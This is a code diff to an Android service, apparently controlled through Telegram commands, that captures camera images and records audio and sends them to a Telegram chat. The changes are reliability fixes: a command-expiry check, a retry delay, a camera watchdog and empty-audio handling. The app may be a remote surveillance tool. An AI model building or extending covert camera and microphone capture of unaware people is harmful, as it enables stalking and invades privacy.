@@ -687,7 +687,8 @@ class MonitoringService : Service() {
     }
 
     private suspend fun handleTelegramCommand(raw: String, sentAtSec: Long = 0L) {
-        if (sentAtSec > 0 && System.currentTimeMillis() / 1000L - sentAtSec > COMMAND_MAX_AGE_SEC) {
+        val nowSec = System.currentTimeMillis() / 1000L
+        if (sentAtSec > 0 && sentAtSec <= nowSec && nowSec - sentAtSec > COMMAND_MAX_AGE_SEC) {
             sendToTelegram("\u23F3\uFE0F Command kedaluwarsa (dikirim > ${COMMAND_MAX_AGE_SEC / 60} menit lalu). Kirim ulang.")
             return
         }
@@ -1327,7 +1328,7 @@ class MonitoringService : Service() {
                     throw e
                 } catch (_: Exception) {
                 }
-                delay(2_000L)
+                delay(5_000L)
             }
         }
     }
@@ -1886,6 +1887,7 @@ class MonitoringService : Service() {
         val wd = serviceScope.launch {
             delay(35_000)
             if (cameraAttempt.get() == attempt && cameraBusy.compareAndSet(true, false)) {
+                cameraAttempt.incrementAndGet()
                 android.util.Log.w("MonitoringService", "Camera watchdog: capture did not finish, flag reset")
                 try {
                     cameraService.forceReset()
@@ -2147,6 +2149,14 @@ class MonitoringService : Service() {
             try {
                 recorder.stop()
             } catch (_: Exception) {
+            }
+            if (!audioFile.exists() || audioFile.length() == 0L) {
+                try {
+                    deleteQuietly(audioFile)
+                } catch (_: Exception) {
+                }
+                sendToTelegram("Record failed (empty audio). Please try again.")
+                return
             }
             if (sendAudioFile(audioFile)) {
                 sendToTelegram("\uD83C\uDF99\uFE0F Audio sent (${seconds}s).")
